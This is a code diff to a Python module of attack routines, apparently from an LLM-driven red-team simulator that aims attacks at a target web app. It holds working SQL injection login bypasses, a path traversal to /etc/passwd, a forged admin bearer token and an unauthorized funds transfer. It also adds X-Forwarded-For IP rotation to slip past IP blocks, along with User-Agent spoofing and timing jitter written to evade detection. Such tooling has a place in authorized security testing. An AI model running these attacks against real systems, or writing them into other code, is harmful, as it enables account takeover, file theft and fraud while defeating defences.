@@ -46,7 +46,6 @@ def _run_double_encoded_sqli(state: SystemState, decision: LLMDecision) -> Attac
     """
     Applies up to 3x urllib unquote locally so the JSON body carries the real SQLi bytes (CWE-89).
     """
-    _ = state
     pl = decision.get("payload") or {}
     raw = pl.get("username") or _DOUBLE_ENCODED_USER
     user = raw
@@ -60,7 +59,10 @@ def _run_double_encoded_sqli(state: SystemState, decision: LLMDecision) -> Attac
     url = eh.target_url("/login")
 
     try:
-        with httpx.Client(timeout=_CLIENT_TIMEOUT) as client:
+        with httpx.Client(
+            timeout=_CLIENT_TIMEOUT,
+            headers=eh.merge_xff_headers(state, {}),
+        ) as client:
             r = client.post(url, json={"username": user, "password": pw})
     except Exception as e:
         return _ev_fail("sqli_double_encoded", str(e))
@@ -82,7 +84,6 @@ def _run_timing_mimic(state: SystemState, decision: LLMDecision) -> AttackEvent:
     """
     Lognormal delays between requests to mimic human jitter; then sends embedded attack.
     """
-    _ = state
     # μ=0.8, σ=0.6 — irregular inter-arrival (spec)
     delay = random.lognormvariate(0.8, 0.6)
     time.sleep(min(delay, 5.0))
@@ -93,7 +94,10 @@ def _run_timing_mimic(state: SystemState, decision: LLMDecision) -> AttackEvent:
     url = eh.target_url(decision.get("target_endpoint") or "/login")
 
     try:
-        with httpx.Client(timeout=_CLIENT_TIMEOUT) as client:
+        with httpx.Client(
+            timeout=_CLIENT_TIMEOUT,
+            headers=eh.merge_xff_headers(state, {}),
+        ) as client:
             r = client.post(url, json={"username": user, "password": pw})
     except Exception as e:
         return _ev_fail("timing_mimic", str(e))
@@ -111,8 +115,10 @@ def _run_timing_mimic(state: SystemState, decision: LLMDecision) -> AttackEvent:
 
 
 def _run_ua_spoof(state: SystemState, decision: LLMDecision) -> AttackEvent:
-    """Uses a browser User-Agent instead of python-httpx default (fingerprint evasion)."""
-    _ = state
+    """
+    Uses a browser User-Agent to evade behavioral fingerprinting (CWE-287).
+    When localhost is IP-blocked, merge_xff_headers also adds XFF (first-layer bypass).
+    """
     ua = (
         "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) "
         "AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36"
@@ -122,59 +128,132 @@ def _run_ua_spoof(state: SystemState, decision: LLMDecision) -> AttackEvent:
         "username": pl.get("username", "admin' --"),
         "password": pl.get("password", ""),
     }
-    url = eh.target_url(decision.get("target_endpoint") or "/login")
+    target_ep = decision.get("target_endpoint") or "/login"
+    url = eh.target_url(target_ep)
 
     try:
         with httpx.Client(
             timeout=_CLIENT_TIMEOUT,
-            headers={"User-Agent": ua},
+            headers=eh.merge_xff_headers(state, {"User-Agent": ua}),
         ) as client:
             r = client.post(url, json=body)
     except Exception as e:
         return _ev_fail("ua_spoofing", str(e))
 
+    if r.status_code == 403:
+        result = "blocked"   # IP-blocked; distinguish from technique failure
+    elif r.status_code == 200:
+        result = "success"
+    else:
+        result = "failed"
+
     return AttackEvent(
         type="ua_spoofing",
-        target="/login",
+        target=target_ep,
         payload=ua[:60],
-        result="success" if r.status_code == 200 else "failed",
+        result=result,
         evidence=f"HTTP {r.status_code} {r.text[:200]}",
-        cwe="CWE-89",
+        cwe="CWE-287",
         severity="medium",
         timestamp=time.time(),
     )
 
 
+# Correct HTTP method per endpoint — never trust the LLM's method field for this
+_ENDPOINT_METHOD: Dict[str, str] = {
+    "/login":    "POST",
+    "/transfer": "POST",
+    "/data":     "GET",
+    "/admin":    "GET",
+    "/files":    "GET",
+}
+
+# Default attack payload/params per endpoint for the XFF bypass attempt
+_ENDPOINT_DEFAULT_ATTACK: Dict[str, Any] = {
+    "/login":    {"json": {"username": "admin' OR '1'='1' --", "password": ""}},
+    "/transfer": {"json": {"amount": 1.0, "to": "attacker"}},
+    "/data":     {"params": {"id": "1"}},
+    "/admin":    {"params": {}, "extra_headers": {"Authorization": "Bearer admin"}},
+    "/files":    {"params": {"path": "../../../etc/passwd"}},
+}
+
+
 def _run_header_inject(state: SystemState, decision: LLMDecision) -> AttackEvent:
     """
-    X-Forwarded-For spoof — may bypass IP blocks if middleware trusts the header.
-    """
-    _ = state
-    pl = decision.get("payload") or {}
-    spoof_ip = pl.get("x_forwarded_for", "10.0.0.100")
-    url = eh.target_url(decision.get("target_endpoint") or "/login")
-    headers = {
-        "X-Forwarded-For": str(spoof_ip),
-        "X-Real-IP": str(spoof_ip),
-    }
+    X-Forwarded-For spoof — bypasses IP blocks when middleware trusts the header.
 
+    Key design decisions:
+    - Method is determined by the target endpoint, NOT the LLM's 'method' field
+      (LLMs frequently output wrong methods; /login and /transfer are POST-only)
+    - Uses rotating IP pool; skips recently-blocked IPs
+    - Builds endpoint-appropriate payloads so the attack is meaningful after bypass
+    """
+    pl = dict(decision.get("payload") or {})
+    pl.pop("x_forwarded_for", None)  # remove meta-field, not part of request body
+
+    target_ep = (decision.get("target_endpoint") or "/login").rstrip("/")
+    if not target_ep.startswith("/"):
+        target_ep = "/" + target_ep
+
+    spoof_ip = eh.pick_xff_ip_avoiding_recent_blocks(state)
+    xff_headers: Dict[str, str] = {"X-Forwarded-For": spoof_ip, "X-Real-IP": spoof_ip}
+
+    # Endpoint-aware method — never rely on LLM's method field
+    method = _ENDPOINT_METHOD.get(target_ep, "GET")
+    attack_spec = dict(_ENDPOINT_DEFAULT_ATTACK.get(target_ep, {"params": {}}))
+
+    # Merge any extra headers (e.g. Authorization for /admin)
+    extra_headers = attack_spec.pop("extra_headers", {})
+    all_headers = {**xff_headers, **extra_headers}
+
+    # LLM-supplied payload fields override defaults (e.g. specific username/amount)
+    if pl:
+        if "json" in attack_spec:
+            attack_spec["json"] = {**attack_spec["json"], **pl}
+        elif "params" in attack_spec:
+            attack_spec["params"] = {**attack_spec["params"], **pl}
+
+    # /transfer needs an auth token — obtain one via the spoofed IP identity
+    if target_ep == "/transfer":
+        try:
+            with httpx.Client(timeout=_CLIENT_TIMEOUT, headers=xff_headers) as login_client:
+                lr = login_client.post(
+                    eh.target_url("/login"),
+                    json={"username": "admin' OR '1'='1' --", "password": ""},
+                )
+            if lr.status_code == 200:
+                token = eh.extract_token_from_response_json(lr)
+                if token:
+                    all_headers["Authorization"] = f"Bearer {token}"
+                else:
+                    return _ev_fail("header_injection", "/transfer: login succeeded but no token")
+            else:
+                return _ev_fail("header_injection", f"/transfer: login via XFF returned {lr.status_code}")
+        except Exception as e:
+            return _ev_fail("header_injection", f"/transfer login error: {e}")
+
+    url = eh.target_url(target_ep)
     try:
-        with httpx.Client(timeout=_CLIENT_TIMEOUT, headers=headers) as client:
-            r = client.post(
-                url,
-                json={
-                    "username": pl.get("username", "admin' --"),
-                    "password": pl.get("password", ""),
-                },
-            )
+        with httpx.Client(timeout=_CLIENT_TIMEOUT, headers=all_headers) as client:
+            if method == "POST":
+                r = client.post(url, json=attack_spec.get("json", {}))
+            else:
+                r = client.get(url, params=attack_spec.get("params") or None)
     except Exception as e:
         return _ev_fail("header_injection", str(e))
 
+    if r.status_code == 403:
+        result = "blocked"
+    elif r.status_code == 200:
+        result = "success"
+    else:
+        result = "failed"
+
     return AttackEvent(
         type="header_injection",
-        target="/login",
-        payload=f"X-Forwarded-For={spoof_ip}",
-        result="success" if r.status_code == 200 else "failed",
+        target=target_ep,
+        payload=f"XFF={spoof_ip} {method} {target_ep}",
+        result=result,
         evidence=f"HTTP {r.status_code} {r.text[:200]}",
         cwe="CWE-20",
         severity="medium",
